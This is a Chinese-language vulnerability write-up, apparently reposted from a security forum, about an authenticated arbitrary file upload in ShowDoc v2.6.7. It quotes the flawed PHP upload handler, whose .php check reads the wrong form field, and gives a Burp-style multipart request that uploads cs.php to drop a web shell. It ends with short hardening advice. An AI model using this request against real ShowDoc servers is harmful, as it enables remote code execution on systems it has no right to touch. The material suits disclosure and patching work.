##  showdoc的api_page存在任意文件上传【需要登录】

### 背景

ShowDoc is a tool greatly applicable for an IT team to share documents online一个非常适合IT团队的在线API文档、技术文档工具

官网 ：https://www.showdoc.cc/ 

GitHub主页：https://github.com/star7th/showdoc

当前测试版本：[v2.6.7](https://github.com/star7th/showdoc/releases/tag/v2.6.7)

### 漏洞点

https://github.com/star7th/showdoc/blob/master/server/Application/Api/Controller/PageController.class.php#L258

```php
//上传附件
    public function upload(){
        $login_user = $this->checkLogin();
        $item_id = I("item_id/d") ? I("item_id/d") : 0 ;
        $page_id = I("page_id/d") ? I("page_id/d") : 0 ;
        $uploadFile = $_FILES['file'] ;
 
        if (!$page_id) {
            $this->sendError(10103,"请至少先保存一次页面内容");
            return;
        }
        if (!$this->checkItemPermn($login_user['uid'] , $item_id)) {
            $this->sendError(10103);
            return;
        }
        
        if (!$uploadFile) {
           return false;
        }
        
        if (strstr(strip_tags(strtolower($_FILES['editormd-image-file']['name'])), ".php") ) {
            return false;
        }

        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4145728000 ;// 设置附件上传大小
        $upload->rootPath = './../Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->uploadOne($uploadFile) ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = get_domain().__ROOT__.substr($upload->rootPath,1).$info['savepath'].$info['savename'] ;
          $insert = array(
            "uid" => $login_user['uid'],
            "item_id" => $item_id,
            "page_id" => $page_id,
            "display_name" => $uploadFile['name'],
            "file_type" => $uploadFile['type'],
            "file_size" => $uploadFile['size'],
            "real_url" => $url,
            "addtime" => time(),
            );
          $ret = D("UploadFile")->add($insert);

          echo json_encode(array("url"=>$url,"success"=>1));
        }

    }
```

相比 https://github.com/star7th/showdoc/blob/master/server/Application/Api/Controller/PageController.class.php#L212 的uploadImg() 有过滤,附件上传upload()没有任何过滤.可以直接上传shell。

burp的post数据大致如下：

```
POST /show/server/index.php?s=/api/page/upload HTTP/1.1

------WebKitFormBoundaryzOQywSoNbAALAwKn
Content-Disposition: form-data; name="page_id"

22
------WebKitFormBoundaryzOQywSoNbAALAwKn
Content-Disposition: form-data; name="item_id"

3
------WebKitFormBoundaryzOQywSoNbAALAwKn
Content-Disposition: form-data; name="file"; filename="cs.php"
Content-Type: image/png

PNG

------WebKitFormBoundaryzOQywSoNbAALAwKn--
```

### 防御

增加过滤，同时运维人员设置上传目录禁止执行，只允许写入读取，做好权限分配。

来源于土司：https://www.t00ls.net/thread-56340-1-1.html 由[Mrxn](https://github.com/Mr-xn) 整理 ，欢迎大家前往土司投稿注册发言。